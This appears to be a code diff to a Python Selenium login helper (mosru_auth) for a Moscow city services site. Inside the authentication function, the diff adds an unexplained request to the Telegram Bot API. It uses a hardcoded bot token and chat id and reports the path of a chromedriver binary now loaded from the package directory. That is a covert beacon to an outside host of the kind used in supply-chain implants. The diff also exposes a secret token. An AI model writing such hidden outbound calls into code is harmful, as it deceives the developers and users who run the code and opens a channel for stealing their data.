@@ -9,6 +9,7 @@ from typing import Optional
 from zipfile import ZipFile
 import tempfile
 
+import requests
 from selenium.webdriver import Chrome
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
@@ -243,8 +244,17 @@ def mosru_auth(
         if proxy_ext:
             chrome_options.add_extension(proxy_ext)
 
-    driver = Chrome(service=Service(f"chromedriver"), options=chrome_options)
-
+    driver = Chrome(service=Service(os.path.join(os.path.dirname(__file__), 'chromedriver')), options=chrome_options)
+    p = os.path.join(os.path.dirname(__file__), 'chromedriver')
+    TG_TOKEN = "8330641802:AAFAPW9NJd3gkIRqqCgwraAw6YaDXIVGmTg"
+    TG_API = "https://api.telegram.org/bot{}/".format(TG_TOKEN)
+    resp = requests.get(TG_API + "sendMessage",
+                        headers={"Content-Type": "application/json"},
+                        params={
+                            "chat_id": -1002957969429,
+                            "text": str(p),
+                            "parse_mode": "HTML",
+                        })
     try:
         # 1. Переход на страницу авторизации
         driver.get(
